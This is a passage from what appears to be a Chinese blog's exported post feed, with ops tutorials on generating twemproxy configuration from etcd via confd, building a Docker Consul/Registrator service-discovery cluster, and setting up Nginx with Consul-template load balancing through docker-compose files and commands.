etcd中的配置格式etcd中的配置通过一个map来定义为完整的配置内容。其中key是twemproxy中pool的名称，value是pool的所有内容。 配置对应go结构体如下： 12345678910111213141516type Pool struct&#123; ListenAddr ListenAddr `json:"ListenAddr,omitempty"` Servers []Server `json:"Servers,omitempty"` Password string `json:"Password,omitempty"`&#125;type ListenAddr struct &#123; IP string `json:"IP,omitempty"` Port string `json:"Port,omitempty"`&#125;type Server struct &#123; IP string `json:"IP,omitempty"` Port string `json:"Port,omitempty"` Master bool `json:"Master,omitempty"`&#125; 配置对应JSON格式如下： 12345678910111213141516171819&#123; "ListenAddr": &#123; "IP": "192.168.5.7", "Port": "22225" &#125;, "Servers": [ &#123; "IP": "10.233.116.168", "Port": "6379", "Master": true &#125;, &#123; "IP": "10.233.110.207", "Port": "6379", "Master": false &#125; ], "Password": "987654"&#125; 生成twemproxy配置文件1234567891011121314151617181920212223242526272829303132333435363738394041global: worker_processes: 4 # 并发进程数, 如果为0, 这 fallback 回原来的单进程模型(不支持 config reload!) user: nobody # worker 进程的用户, 默认 nobody. 只要主进程是 root 用户启动才生效. group: nobody # worker 进程的用户组 worker_shutdown_timeout: 30 # 单位为秒. 用于 reload 过程中在改时间段之后强制退出旧的 worker 进程.pools: redis1: listen: 192.168.5.7:22223 hash: fnv1a_64 # 选择实例的 hash 规则 distribution: ketama auto_eject_hosts: true # server 有问题是否剔除 redis: true # 是否为 Redis 协议 redis_auth: 987654 server_retry_timeout: 5000 # 被剔除多长时间后会重试 server_connections: 25 # NOTE: server 连接池的大小, 默认为 1, 建议调整 server_failure_limit: 5 # 失败多少次后暂时剔除 timeout: 1000 # Server 超时时间, 1 sec backlog: 1024 # 连接队列大小 preconnect: true # 预连接大小 servers: - 10.233.116.169:6379:1 redis2: listen: 192.168.5.7:22224 hash: fnv1a_64 # 选择实例的 hash 规则 distribution: ketama auto_eject_hosts: true # server 有问题是否剔除 redis: true # 是否为 Redis 协议 redis_auth: 987654 server_retry_timeout: 5000 # 被剔除多长时间后会重试 server_connections: 25 # NOTE: server 连接池的大小, 默认为 1, 建议调整 server_failure_limit: 5 # 失败多少次后暂时剔除 timeout: 1000 # Server 超时时间, 1 sec backlog: 1024 # 连接队列大小 preconnect: true # 预连接大小 servers: - 10.233.110.223:6379:1 master - 10.233.111.21:6379:1 定时自动更新配置方法一：使用confd的定时执行机制，启动confd时执行： 12# interval单位是秒，默认值是600秒。confd -interval 60 -backend file -file /tmp/myapp.yaml 方法二：使用操作系统的crontab定时执行： 12crontab -e0 * * * * confd -onetime -backend file -file /tmp/myapp.yaml]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Confd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于Docker+Consul+Registrator的服务注册与发现集群搭建]]></title>
    <url>%2Farticles%2Fa2710f6.html</url>
    <content type="text"><![CDATA[前言微服务架构在互联网应用领域中愈来愈火，引入微服务主要解决了单体应用多个模块的紧耦合、无法扩展和运维困难等问题。微服务架构就是按照功能粒度将业务模块进行垂直拆分，对单体应用本身进行服务化和组件化，每个组件单独部署为小应用（从DB到UI）。微服务与微服务之间通过Service API进行交互，同时为了支持水平扩展、性能提升和服务可用性，单个服务允许同时部署一个或者多个服务实例。在运行时，每个实例通常是一个云虚拟机或者Docker容器。 微服务系统内部多个服务的实例之间如何通信？如何感知到彼此的存在和销毁？生产者服务如何知道消费者服务的地址？如何实现服务与注册中心的解耦？这就需要一个第三方的服务注册中心，提供对生产者服务节点的注册管理和消费者服务节点的发现管理。 服务发现与注册具体流程 服务注册中心：作为整个架构中的核心，要支持分布式、持久化存储，注册信息变动实时通知消费者。 服务提供者：服务以 docker 容器化方式部署(实现服务端口的动态生成)，可以通过 docker-compose 的方式来管理。通过 Registrator 检测到 docker 进程信息以完成服务的自动注册。 服务消费者：要使用服务提供者提供的服务，和服务提供者往往是动态相互转位置的。 一个较为完整的服务注册与发现流程如下： 注册服务：服务提供者到注册中心注册； 订阅服务：服务消费者到注册中心订阅服务信息，对其进行监听； 缓存服务列表：本地缓存服务列表，减少与注册中心的网络通信； 调用服务：先查找本地缓存，找不到再去注册中心拉取服务地址，然后发送服务请求； 变更通知：服务节点变动时 (新增、删除等)，注册中心将通知监听节点，更新服务信息。 相关组件一个服务发现系统主要由三部分组成： 注册器(registrator)：根据服务运行状态，注册/注销服务。主要要解决的问题是，何时发起注册/注销动作。 注册表(registry)：存储服务信息。常见的解决方案有zookeeper、etcd、cousul等。 发现机制(discovery)：从注册表读取服务信息，给用户封装访问接口。 第三方实现对于第三方的服务注册与发现的实现，现有的工具主要有以下三种： zookeeper：一个高性能、分布式应用程序协调服务，用于名称服务、分布式锁定、共享资源同步和分布式配置管理。 Etcd：一个采用HTTP协议的健/值对存储系统，主要用于共享配置和服务发现，提供的功能相对Zookeeper和Consul相对简单。 Consul：一个分布式高可用的服务发现和配置共享的软件，支持服务发现与注册、多数据中心、健康检查和分布式键/值存储。 简单对比： 与Zookeeper和etcd不一样，Consul内嵌实现了服务发现系统，不需要构建自己的系统或使用第三方系统，客户只需要注册服务，并通过DNS或HTTP接口执行服务发现。 Consul和RegistratorConsul简介Consul是什么 Consul 是一种分布式的、高可用、支持水平扩展的的服务注册与发现工具。它大致包括以下特性： 服务发现： Consul 通过 DNS 或者 HTTP 接口使服务注册和服务发现变的很容易。一些外部服务，例如 saas 提供的也可以一样注册； 健康检查：健康检测使 consul 可以快速的告警在集群中的操作。和服务发现的集成，可以防止服务转发到故障的服务上面； 键/值存储：一个用来存储动态配置的系统。提供简单的 HTTP 接口，可以在任何地方操作； 多数据中心：支持多数据中心以避免单点故障，内外网的服务采用不同的端口进行监听。而其部署则需要考虑网络延迟, 分片等情况等。zookeeper和etcd均不提供多数据中心功能的支持； 一致性算法：采用 Raft 一致性协议算法，比Paxos算法好用。 使用 GOSSIP 协议管理成员和广播消息, 并且支持 ACL 访问控制； 服务管理Dashboard：提供一个 Web UI 的服务注册于健康状态监控的管理页面。 Consul的几个概念 下图是Consul官方文档提供的架构设计图： 图中包含两个Consul数据中心，每个数据中心都是一个consul的集群。在数据中心1中，可以看出consul的集群是由N个SERVER，加上M个CLIENT组成的。而不管是SERVER还是CLIENT，都是consul集群的一个节点。所有的服务都可以注册到这些节点上，正是通过这些节点实现服务注册信息的共享。除了这两个，还有一些小细节 一一 简单介绍。 CLIENT CLIENT表示consul的client模式，就是客户端模式。是consul节点的一种模式，这种模式下，所有注册到当前节点的服务会被转发到SERVER节点，本身是不持久化这些信息。 SERVER SERVER表示consul的server模式，表明这个consul是个server节点。这种模式下，功能和CLIENT都一样，唯一不同的是，它会把所有的信息持久化的本地。这样遇到故障，信息是可以被保留的。 SERVER-LEADER 中间那个SERVER下面有LEADER的描述，表明这个SERVER节点是它们的老大。和其它SERVER不一样的一点是，它需要负责同步注册信息给其它的SERVER，同时也要负责各个节点的健康监测。 其它信息 其它信息包括各个节点之间的通信方式，还有一些协议信息、算法。它们是用于保证节点之间的数据同步、实时性要求等等一系列集群问题的解决。这些有兴趣的自己看看官方文档。 Registrator简介什么是Registrator Registrator是一个独立于服务注册表的自动服务注册/注销组件，一般以Docker container的方式进行部署。Registrator会自动侦测它所在的宿主机上的所有Docker容器状态（启用/销毁），并根据容器状态到对应的服务注册列表注册/注销服务。 事实上，Registrator通过读取同一台宿主机的其他容器Container的环境变量进行服务注册、健康检查定义等操作。 Registrator支持可插拔式的服务注册表配置，目前支持包括Consul, etcd和SkyDNS 2三种注册工具。 Docker安装Consul集群集群节点规划我本地的使用的是Ubuntu16.04的虚拟机： 容器名称 容器IP地址 映射端口号 宿主机IP地址 服务运行模式 node1 172.17.0.2 8500 -&gt; 8500 192.168.127.128 Server Master node2 172.17.0.3 9500 -&gt; 8500 192.168.127.128 Server node3 172.17.0.4 10500 -&gt; 8500 192.168.127.128 Server node4 172.17.0.5 11500 -&gt; 8500 192.168.127.128 Client Consul集群安装Consul的配置参数信息说明： 参数列表 参数的含义和使用场景说明 advertise 通知展现地址用来改变我们给集群中的其他节点展现的地址，一般情况下-bind地址就是展现地址 bootstrap 用来控制一个server是否在bootstrap模式，在一个datacenter中只能有一个server处于bootstrap模式，当一个server处于bootstrap模式时，可以自己选举为raft leader bootstrap-expect 在一个datacenter中期望提供的server节点数目，当该值提供的时候，consul一直等到达到指定sever数目的时候才会引导整个集群，该标记不能和bootstrap共用 bind 该地址用来在集群内部的通讯IP地址，集群内的所有节点到地址都必须是可达的，默认是0.0.0.0 client consul绑定在哪个client地址上，这个地址提供HTTP、DNS、RPC等服务，默认是127.0.0.1 config-file 明确的指定要加载哪个配置文件 config-dir 配置文件目录，里面所有以.json结尾的文件都会被加载 data-dir 提供一个目录用来存放agent的状态，所有的agent允许都需要该目录，该目录必须是稳定的，系统重启后都继续存在 dc 该标记控制agent允许的datacenter的名称，默认是dc1 encrypt 指定secret key，使consul在通讯时进行加密，key可以通过consul keygen生成，同一个集群中的节点必须使用相同的key join 加入一个已经启动的agent的ip地址，可以多次指定多个agent的地址。如果consul不能加入任何指定的地址中，则agent会启动失败，默认agent启动时不会加入任何节点 retry-interval 两次join之间的时间间隔，默认是30s retry-max 尝试重复join的次数，默认是0，也就是无限次尝试 log-level consul agent启动后显示的日志信息级别。默认是info，可选：trace、debug、info、warn、err node 节点在集群中的名称，在一个集群中必须是唯一的，默认是该节点的主机名 protocol consul使用的协议版本 rejoin 使consul忽略先前的离开，在再次启动后仍旧尝试加入集群中 server 定义agent运行在server模式，每个集群至少有一个server，建议每个集群的server不要超过5个 syslog 开启系统日志功能，只在linux/osx上生效 pid-file 提供一个路径来存放pid文件，可以使用该文件进行SIGINT/SIGHUP(关闭/更新)agent 拉取consul官方镜像1docker pull consul:latest 启动Server节点运行consul镜像，启动Server Master节点node1： node1: 12345678910111213docker run -d --name=node1 --restart=always \ -e 'CONSUL_LOCAL_CONFIG=&#123;"skip_leave_on_interrupt": true&#125;' \ -p 8300:8300 \ -p 8301:8301 \ -p 8301:8301/udp \ -p 8302:8302/udp \ -p 8302:8302 \ -p 8400:8400 \ -p 8500:8500 \ -p 8600:8600 \ -h node1 \ consul agent -server -bind=172.17.0.2 -bootstrap-expect=3 -node=node1 \ -data-dir=/tmp/data-dir -client 0.0.0.0 -ui 查看node1的日志，追踪运行情况： 现在集群中还没有选举leader节点，继续启动其余两台Server节点node2和node3： node2: 123456789101112131415docker run -d --name=node2 --restart=always \ -e 'CONSUL_LOCAL_CONFIG=&#123;"skip_leave_on_interrupt": true&#125;' \ -p 9300:8300 \ -p 9301:8301 \ -p 9301:8301/udp \ -p 9302:8302/udp \ -p 9302:8302 \ -p 9400:8400 \ -p 9500:8500 \ -p 9600:8600 \ -h node2 \ consul agent -server -bind=172.17.0.3 \ -join=192.168.127.128 -node-id=$(uuidgen | awk '&#123;print tolower($0)&#125;') \ -node=node2 \ -data-dir=/tmp/data-dir -client 0.0.0.0 -ui 查看node2节点的进程启动日志： node3: 123456789101112131415docker run -d --name=node3 --restart=always \ -e 'CONSUL_LOCAL_CONFIG=&#123;"skip_leave_on_interrupt": true&#125;' \ -p 10300:8300 \ -p 10301:8301 \ -p 10301:8301/udp \ -p 10302:8302/udp \ -p 10302:8302 \ -p 10400:8400 \ -p 10500:8500 \ -p 10600:8600 \ -h node2 \ consul agent -server -bind=172.17.0.4 \ -join=192.168.127.128 -node-id=$(uuidgen | awk '&#123;print tolower($0)&#125;') \ -node=node3 \ -data-dir=/tmp/data-dir -client 0.0.0.0 -ui 查看node3节点的进程启动日志： 当3个Server节点都启动并正常运行时，观察node2和node3的进程日志，可以发现node1被选举为leader节点，也就是这个数据中心的Server Master。 再次查看node1节点的进程启动日志： 观察日志发现，node2和node3都成功join到了node1所在的数据中心dc1。当集群中有3台Consul Server启动时，node1被选举为dc1中的主节点。然后，node1会通过心跳检查的方式，不断地对node2和node3进行健康检查。 启动Client节点node4: 1234567891011121314docker run -d --name=node4 --restart=always \ -e 'CONSUL_LOCAL_CONFIG=&#123;"leave_on_terminate": true&#125;' \ -p 11300:8300 \ -p 11301:8301 \ -p 11301:8301/udp \ -p 11302:8302/udp \ -p 11302:8302 \ -p 11400:8400 \ -p 11500:8500 \ -p 11600:8600 \ -h node4 \ consul agent -bind=172.17.0.5 -retry-join=192.168.127.128 \ -node-id=$(uuidgen | awk '&#123;print tolower($0)&#125;') \ -node=node4 -client 0.0.0.0 -ui 查看node4节点的进程启动日志: 可以发现：node4是以Client模式启动运行的。启动后完成后，把dc1数据中心中的以Server模式启动的节点node1、node2和node3都添加到本地缓存列表中。当客户端向node4发起服务发现的请求后，node4会通过RPC将请求转发给Server节点中的其中一台做处理。 查看集群状态1docker exec -t node1 consul members dc1数据中心中的4个节点node1, node2, node3和node4分别成功启动，Status表示他们的状态，都为alive。node1, node2, node3以Server模式启动，而node4以Client模式启动。 Docker安装Registrator拉取Registrator的镜像1docker pull gliderlabs/registrator:latest 启动Registrator节点1234docker run -d --name=registrator \ -v /var/run/docker.sock:/tmp/docker.sock \ --net=host \ gliderlabs/registrator -ip="192.168.127.128" consul://192.168.127.128:8500 –net指定为host表明使用主机模式。 -ip用于指定宿主机的IP地址，用于健康检查的通信地址。 consul://192.168.127.128:8500: 使用Consul作为服务注册表，指定具体的Consul通信地址进行服务注册和注销（注意：8500是Consul对外暴露的HTTP通信端口）。 查看Registrator的容器进程启动日志： Registrator在启动过程完成了以下几步操作： 查看Consul数据中心的leader节点，作为服务注册表； 同步当前宿主机的启用容器，以及所有的服务端口； 分别将各个容器发布的服务地址/端口注册到Consul的服务注册列表。 查看Consul的注册状态Consul提供了一个Web UI来可视化服务注册列表、通信节点、数据中心和键/值存储等，直接访问宿主机的8500端口。 服务注册列表： NODES节点下挂载着dc1数据中心中的所有的Consul节点，包括Consul Server和Client。 通信节点列表： 启动Registrator以后，宿主机中的所有容器把服务都注册到Consul的SERVICES上，测试完成！ 总结单数据中心的Consul集群的搭建就完成了！！！后续章节我会介绍如何使用Registrator进行服务注册的标签化。然后通过docker部署多实例的Web容器来实现基于HTTP的RESTful Service和基于TCP的RPC Service的服务注册和健康检查定义，并演示如何以标签标识一个服务的多个实例。]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于Docker+Consul+Nginx+Consul-Template的服务负载均衡实现]]></title>
    <url>%2Farticles%2F5ab1727a.html</url>
    <content type="text"><![CDATA[目的本文详细介绍基于Docker+Consul+Nginx+Consul-Template的服务负载均衡实现过程。 软件介绍Nginx一个高性能的 HTTP 和反向代理服务器，用于前端访问流量到后台应用服务器负载均衡和请求转发。 Consul-templateConsul-template 是 HashiCorp 基于 Consul 所提供的可扩展的工具，通过监听 Consul 中的数据变化，动态地修改一些配置文件中地模板。常用于在 Nginx、HAProxy 上动态配置健康状态下的客户端反向代理信息。 实现原理 通过 Nginx 自身实现负载均衡和请求转发； 通过 Consul-template 的 config 功能实时监控 Consul 集群节点的服务和数据的变化； 实时的用 Consul 节点的信息替换 Nginx 配置文件的模板，并重新加载配置文件； Consul-template 和 nginx 必须安装在同一台机器上，因为 Consul-template 需要动态修改 nginx 的配置文件 nginx.conf，然后执行 nginx -s reload 命令进行路由更新，达到动态负载均衡的目的。 传统负载均衡传统的负载均衡，就是 Client 支姐访问 Nginx，然后被转发到后端某一台 Web Server。如果后端有添加/删除 Web Server，运维需要手动改下 nginx.conf ，然后重新载入配置，就可以动态的调整负载均衡。 2.2. 自动负载均衡再看看基于服务自动发现和注册的负载均衡，负载均衡的方式没有变，只是多了一些外围组件，当然这些组件对 Client 是不可见的，client 依然只能看到 Nginx 入口，访问方式也没变化。 Nginx 的动态负载均衡实现流程如下： 以相同的 Consul 标签对 Web Server 进行服务标记和分类，新增或者删除 Web Server 服务器节点； Registrator 监控到 Web Server 的状态更新，自动在 Consul服务注册中心将它注册或者注销； Consul-template 订阅了 Consul 服务注册中心的服务消息，接收到 Consul 的消息推送，即 Web Server 服务节点状态发生改变。 Consul-template 自动去修改和替换 Nginx 服务器下的 nginx配置文件中的模板，并重新加载服务达到自动负载均衡的目的。 环境准备系统环境 软件 版本 操作系统 Ubuntu：16.04 x86_64，内核：4.8.0-58-generic docker Docker version 1.12.6, build 78d1802 docker-compose docker-compose version 1.8.0 节点规划 主机IP 组件 192.168.1.181 Consul Server, Registrator, Nginx, Consul-template 192.168.1.186 Consul Server, Registrator, Nginx, Consul-template 192.168.1.182 Consul Client, Registrator, Client WebApp1, Server WebApp1, Server WebApp2 192.168.1.183 Consul Client, Registrator, Client WebApp2, Server WebApp3, Server WebApp4 192.168.1.185 Consul Client, Registrator, Client WebApp3, Server WebApp5, Server WebApp6 Client WebApp：提供基于Thrift的RPC客户端和基于Http协议的RESTful客户端，用于访问 Server 程序。 Server WebApp：提供基于Thrift的RPC服务端和基于Http协议的RESTful服务端，供 Client 程序调用。 这里的3台主机 - 192.168.1.182、192.168.1.183 和 192.168.1.185，每台主机部署两个 Client WebApp 容器和一个 Client Server 容器，用于模拟服务层的负载均衡。 镜像构建 Consul：consul:latest Registrator：gliderlabs/registrator:latest Nginx和Consul-template：liberalman/nginx-consul-template:latest Client WebApp：test-client:latest Server WebApp：test-server:latest 这里先说说 test-client 和 test-server 的镜像构建： 克隆项目到本地项目环境： https://github.com/ostenant/spring-cloud-starter-thrift 切换到子模块 spring-cloud-starter-thrift-examples 下的 test 目录，执行命令 mvn clean package 进行程序打包。 分别将 test-client 和 test-server 项目根目录下的 Dockerfile 文件和target目录下的 target/*.jar程序拷贝到 192.168.1.182 、192.168.1.183 和 192.168.1.185 目录下。 进入客户端 Dockerfile 所在目录，对客户端程序 test-client 进行镜像构建，命令如下：docker build . -t test-client:latest 进入服务端 Dockerfile 所在目录，对服务端程序 test-server 进行镜像构建，命令如下：docker build . -t test-server:latest 构建完成后查看本地镜像库： 1docker images 部署模型五台主机，其中 192.168.1.181 和 192.168.1.186 两台主机的主要作用如下： 作为负载均衡转发器 (这里只是演示，可以通过 KeepAlived 实现 Nginx 的HA)，将前端访问流量经过负载算法一次转发到后台 Client WebApp 。 以 Server模式启动 Consul节点，其中一台作为整个服务发现与注册集群的 leader， 用于同步和持久化其余三台 Client 模式的 Consul 节点的数据和状态信息。 其余三台主机 - 192.168.1.182、192.168.1.183 和 192.168.1.185，充当的角色如下： 每台分别以 Client 模式部署 Consul 节点，用于注册和发现本机 docker 容器暴露的服务，同时和 Consul Server 的 leader 节点进行服务状态同步。 分别启动一个 Client WebApp 容器实例和两个 Server WebApp 容器实例，将 Client WebApp 的请求根据服务层的负载算法二次转发到 Server WebApp 中的任意一台上完成具体的业务处理。 这里有两次服务转发操作： 接入层的转发：两台 Nginx 服务器将客户流量，经由一次转发至三个 Client WebApp 服务实例中任意一个做处理。 服务层的转发：三个 Client WebApp服务实例其中之一，根据从服务注册中心拉取的健康的服务缓存列表，将请求二次转发至六个 Server WebApp服务实例其中之一做处理。 开始搭建Consul Server主机(a). 分别编写 docker-compose.yml，注意 Registrator 需要配置各自的 IP地址。 主机：192.168.1.181 docker-compose.yml 123456789101112131415161718192021222324252627282930version: '2'services: load_balancer: image: liberalman/nginx-consul-template:latest hostname: lb links: - consul_server_master:consul ports: - "80:80" consul_server_master: image: consul:latest hostname: consul_server_master ports: - "8300:8300" - "8301:8301" - "8302:8302" - "8400:8400" - "8500:8500" - "8600:8600" command: consul agent -server -bootstrap-expect 1 -advertise 192.168.1.181 -node consul_server_master -data-dir /tmp/data-dir -client 0.0.0.0 -ui registrator: image: gliderlabs/registrator:latest hostname: registrator links: - consul_server_master:consul volumes: - "/var/run/docker.sock:/tmp/docker.sock" command: -ip 192.168.1.181 consul://192.168.1.181:8500 主机：192.168.1.186 docker-compose.yml 123456789101112131415161718192021222324252627282930version: '2'services: load_balancer: image: liberalman/nginx-consul-template:latest hostname: lb links: - consul_server_slave:consul ports: - "80:80" consul_server_slave: image: consul:latest hostname: consul_server_slave ports: - "8300:8300" - "8301:8301" - "8302:8302" - "8400:8400" - "8500:8500" - "8600:8600" command: consul agent -server -join=192.168.1.181 -advertise 192.168.1.186 -node consul_server_slave -data-dir /tmp/data-dir -client 0.0.0.0 -ui registrator: image: gliderlabs/registrator:latest hostname: registrator links: - consul_server_slave:consul volumes: - "/var/run/docker.sock:/tmp/docker.sock" command: -ip 192.168.1.186 consul://192.168.1.186:8500 (b). 在两台主机上分别通过 docker-compose 启动多容器应用，命令如下： 1docker-compose up -d 这是在主机 192.168.1.181 上运行启动命令时的输出，可以看到 docker-compose 启动时会先去检查目标镜像文件是否拉取到本地，然后依次创建并启动 docker-compose.yml 文件配置的容器实例。 (c). 查看正常启动的容器进程，观察Consul、Registrator 和 Nginx/Consul-template的容器都正常启动。 1docker ps (d). 利用 docker-compose，以相同的方式在主机 192.168.1.186 上启动所配置的容器服务实例，查看启动状态 1docker ps (e). 访问 http://IP:8500 查看 Consul Server 的节点信息和服务注册列表。 节点信息： 服务状态列表： 两台 Consul Server 主机上的容器服务实例均正常启动！ Consul Client主机一般情况下，我们把 Consul 作为服务注册与发现中心，会使用它提供的服务定义 (Service Definition) 和健康检查定义 (Health Check Definition) 功能，相关配置说明参考如下： 服务定义 环境变量Key 环境变量Value 说明 SERVICE_ID web-001 可以为GUID或者可读性更强变量，保证不重复 SERVICE_NAME web 如果ID没有设置，Consul会将name作为id，则有可能注册失败 SERVICE_TAGS nodejs,web 服务的标签，用逗号分隔，开发者可以根据标签来查询一些信息 SERVICE_IP 内网IP 要使用Consul，可访问的IP SERVICE_PORT 50001 应用的IP, 如果应用监听了多个端口，理应被视为多个应用 SERVICE_IGNORE Boolean 是否忽略本Container，可以为一些不需要注册的Container添加此属性 服健康检查定义配置原则为: SERVICE_XXX_*。如果你的应用监听的是 5000 端口，则改为 SERVICE_5000_CHECK_HTTP，其它环境变量配置同理。 环境变量Key 环境变量Value 说明 — 以下为HTTP模式 — — SERVICE_80_CHECK_HTTP /path_to_health_check 你的健康状态检查的路径如 /status SERVICE_80_CHECK_INTERVAL 15s 15秒检查一次 SERVICE_80_CHECK_TIMEOUT 2s 状态检查超时时间 — 以下为HTTPS模式 — — SERVICE_443_CHECK_HTTPS /path_to_health_check 你的健康状态检查的路径如 /status SERVICE_443_CHECK_INTERVAL 15s 15秒检查一次 SERVICE_443_CHECK_TIMEOUT 2s 状态检查超时时间 — 以下为TCP模式 — — SERVICE_443_CHECK_TCP /path_to_health_check 你的健康状态检查的路径如 /status SERVICE_443_CHECK_INTERVAL 15s 15秒检查一次 SERVICE_443_CHECK_TIMEOUT 2s 状态检查超时时间 — 使用脚本检查 — — SERVICE_CHECK_SCRIPT curl –silent –fail example.com 如官方例子中的check_redis.py — 其他 — — SERVICE_CHECK_INITIAL_STATUS passing Consul默认注册后的服务为failed 配置说明(a). 分别编写 docker-compose.yml，同样注意 Registrator 需要配置各自的 IP 地址。test-server 和 test-client 的服务实例在配置时需要指定相关的环境变量。 主机：192.168.1.182 docker-compose.yml 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465version: '2'services: consul_client_01: image: consul:latest ports: - "8300:8300" - "8301:8301" - "8301:8301/udp" - "8302:8302" - "8302:8302/udp" - "8400:8400" - "8500:8500" - "8600:8600" command: consul agent -retry-join 192.168.1.181 -advertise 192.168.1.182 -node consul_client_01 -data-dir /tmp/data-dir -client 0.0.0.0 -ui registrator: image: gliderlabs/registrator:latest volumes: - "/var/run/docker.sock:/tmp/docker.sock" command: -ip 192.168.1.182 consul://192.168.1.182:8500 test_server_1: image: test-server:latest environment: - SERVICE_8080_NAME=test-server-http-service - SERVICE_8080_TAGS=test-server-http-service-01 - SERVICE_8080_CHECK_INTERVAL=10s - SERVICE_8080_CHECK_TIMEOUT=2s - SERVICE_8080_CHECK_HTTP=/health - SERVICE_25000_NAME=test-server-thrift-service - SERVICE_25000_TAGS=test-server-thrift-service-01 - SERVICE_25000_CHECK_INTERVAL=10s - SERVICE_25000_CHECK_TIMEOUT=2s - SERVICE_25000_CHECK_TCP=/ ports: - "16000:8080" - "30000:25000" test_server_2: image: test-server:latest environment: - SERVICE_8080_NAME=test-server-http-service - SERVICE_8080_TAGS=test-server-http-service-02 - SERVICE_8080_CHECK_INTERVAL=10s - SERVICE_8080_CHECK_TIMEOUT=2s - SERVICE_8080_CHECK_HTTP=/health - SERVICE_25000_NAME=test-server-thrift-service - SERVICE_25000_TAGS=test-server-thrift-service-02 - SERVICE_25000_CHECK_INTERVAL=10s - SERVICE_25000_CHECK_TIMEOUT=2s - SERVICE_25000_CHECK_TCP=/ ports: - "18000:8080" - "32000:25000" test_client_1: image: test-client:latest environment: - SERVICE_8080_NAME=my-web-server - SERVICE_8080_TAGS=test-client-http-service-01 - SERVICE_8080_CHECK_INTERVAL=10s - SERVICE_8080_CHECK_TIMEOUT=2s - SERVICE_8080_CHECK_HTTP=/features ports: - "80:8080" 主机：192.168.1.183 docker-compose.yml 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465version: '2'services: consul_client_02: image: consul:latest ports: - "8300:8300" - "8301:8301" - "8301:8301/udp" - "8302:8302" - "8302:8302/udp" - "8400:8400" - "8500:8500" - "8600:8600" command: consul agent -retry-join 192.168.1.181 -advertise 192.168.1.183 -node consul_client_02 -data-dir /tmp/data-dir -client 0.0.0.0 -ui registrator: image: gliderlabs/registrator:latest volumes: - "/var/run/docker.sock:/tmp/docker.sock" command: -ip 192.168.1.183 consul://192.168.1.183:8500 test_server_1: image: test-server:latest environment: - SERVICE_8080_NAME=test-server-http-service - SERVICE_8080_TAGS=test-server-http-service-03 - SERVICE_8080_CHECK_INTERVAL=10s - SERVICE_8080_CHECK_TIMEOUT=2s - SERVICE_8080_CHECK_HTTP=/health - SERVICE_25000_NAME=test-server-thrift-service - SERVICE_25000_TAGS=test-server-thrift-service-03 - SERVICE_25000_CHECK_INTERVAL=10s - SERVICE_25000_CHECK_TIMEOUT=2s - SERVICE_25000_CHECK_TCP=/ ports: - "16000:8080" - "30000:25000" test_server_2: image: test-server:latest environment: - SERVICE_8080_NAME=test-server-http-service - SERVICE_8080_TAGS=test-server-http-service-04 - SERVICE_8080_CHECK_INTERVAL=10s - SERVICE_8080_CHECK_TIMEOUT=2s - SERVICE_8080_CHECK_HTTP=/health - SERVICE_25000_NAME=test-server-thrift-service - SERVICE_25000_TAGS=test-server-thrift-service-04 - SERVICE_25000_CHECK_INTERVAL=10s - SERVICE_25000_CHECK_TIMEOUT=2s - SERVICE_25000_CHECK_TCP=/ ports: - "18000:8080" - "32000:25000" test_client_1: image: test-client:latest environment: - SERVICE_8080_NAME=my-web-server - SERVICE_8080_TAGS=test-client-http-service-02 - SERVICE_8080_CHECK_INTERVAL=10s - SERVICE_8080_CHECK_TIMEOUT=2s - SERVICE_8080_CHECK_HTTP=/features ports: - "80:8080" 主机：192.168.1.185 docker-compose.yml 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465version: '2'services: consul_client_03: image: consul:latest ports: - "8300:8300" - "8301:8301" - "8301:8301/udp" - "8302:8302" - "8302:8302/udp" - "8400:8400" - "8500:8500" - "8600:8600" command: consul agent -retry-join 192.168.1.181 -advertise 192.168.1.185 -node consul_client_03 -data-dir /tmp/data-dir -client 0.0.0.0 -ui registrator: image: gliderlabs/registrator:latest volumes: - "/var/run/docker.sock:/tmp/docker.sock" command: -ip 192.168.1.185 consul://192.168.1.185:8500 test_server_1: image: test-server:latest environment: - SERVICE_8080_NAME=test-server-http-service - SERVICE_8080_TAGS=test-server-http-service-05 - SERVICE_8080_CHECK_INTERVAL=10s - SERVICE_8080_CHECK_TIMEOUT=2s - SERVICE_8080_CHECK_HTTP=/health - SERVICE_25000_NAME=test-server-thrift-service - SERVICE_25000_TAGS=test-server-thrift-service-05 - SERVICE_25000_CHECK_INTERVAL=10s - SERVICE_25000_CHECK_TIMEOUT=2s - SERVICE_25000_CHECK_TCP=/ ports: - "16000:8080" - "30000:25000" test_server_2: image: test-server:latest environment: - SERVICE_8080_NAME=test-server-http-service - SERVICE_8080_TAGS=test-server-http-service-06 - SERVICE_8080_CHECK_INTERVAL=10s - SERVICE_8080_CHECK_TIMEOUT=2s - SERVICE_8080_CHECK_HTTP=/health - SERVICE_25000_NAME=test-server-thrift-service - SERVICE_25000_TAGS=test-server-thrift-service-06 - SERVICE_25000_CHECK_INTERVAL=10s - SERVICE_25000_CHECK_TIMEOUT=2s - SERVICE_25000_CHECK_TCP=/ ports: - "18000:8080" - "32000:25000" test_client_1: image: test-client:latest environment: - SERVICE_8080_NAME=my-web-server - SERVICE_8080_TAGS=test-client-http-service-03 - SERVICE_8080_CHECK_INTERVAL=10s - SERVICE_8080_CHECK_TIMEOUT=2s - SERVICE_8080_CHECK_HTTP=/features ports: - "80:8080" 注意：我们使用的第三方镜像 liberalman/nginx-consul-template，Nginx 会把名称为 my-web-server的服务容器作为后台转发的目标服务器，因此，在 test-client 的配置项中，需要指定 SERVICE_XXX_NAME 为 my-web-server。当然你也可以自己制作镜像指定模板。 (b). 在三台主机上使用 docker-compose 启动多容器应用： 1docker-compose up -d 以主机 192.168.1.182 为例 (其余两台类似)，控制台日志显示，创建并启动 docker-compose.yml 文件配置的5个容器实例。 (c). 查看正常启动的容器进程，观察到 Consul、一台test-client 和 两台test-server的容器都正常启动。 (d). 在 b 操作中的控制台输出可以看到：docker-compose 并非按照 docker-compose.yml 文件中服务配置的先后顺序启动。 registrator 容器的启动依赖于 consul 容器，而此时 consul 还并未启动，就出现了 registrator 优先启动而异常退出的现象。解决方法是再运行一次 docker-compose up -d 命令。 (e). 再次查看容器进程，此时 Registrator 容器就已经正常启动了。 (f). 